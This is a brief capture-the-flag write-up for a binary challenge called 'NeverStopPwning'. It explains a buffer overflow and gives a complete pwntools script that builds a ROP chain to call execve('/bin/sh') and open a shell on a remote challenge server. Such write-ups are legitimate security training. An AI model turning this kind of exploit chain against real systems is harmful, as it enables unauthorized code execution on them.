# NeverStopPwning
> Author: 堇姬Naup

## Description
Basic Pwn
It have Buffer overflow, and it have enough gadget can do execve.

Let
- rax = 0x3b
- rdi = /bin/sh address
- rsi = 0
- rdx = 0
- and call syscall

You will get shell.

## exploit
```py
from pwn import *

r=process("./chal")
r=remote("23.146.248.196", 41001)
'''
0x000000000044fec7 : pop rax ; ret
0x0000000000401ecf : pop rdi ; ret
0x0000000000409f3e : pop rsi ; ret
0x0000000000482e82 : pop rdx ; ret
0x0000000000401c84 : syscall
0x0000000000433603 : mov qword ptr [rdi], rdx ; ret
'''

binsh = 0x4c7a00
pop_rax = 0x44fec7
pop_rdi = 0x401ecf
pop_rsi = 0x409f3e
pop_rdx = 0x482e82
syscall = 0x401c84
mov_rdx_to_rdi = 0x433603

payload1 =  p64(pop_rdx) + b'/bin/sh\x00'.ljust(8,b'\x00') 
payload1 += p64(pop_rdi) + p64(binsh)
payload1 += p64(mov_rdx_to_rdi)

payload2 =  p64(pop_rax) + p64(0x3b)
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(pop_rsi) + p64(0)
payload2 += p64(pop_rdx) + p64(0)
payload2 += p64(syscall)

r.sendline(b'a'*0x10+ payload1 + payload2)

r.interactive()
```
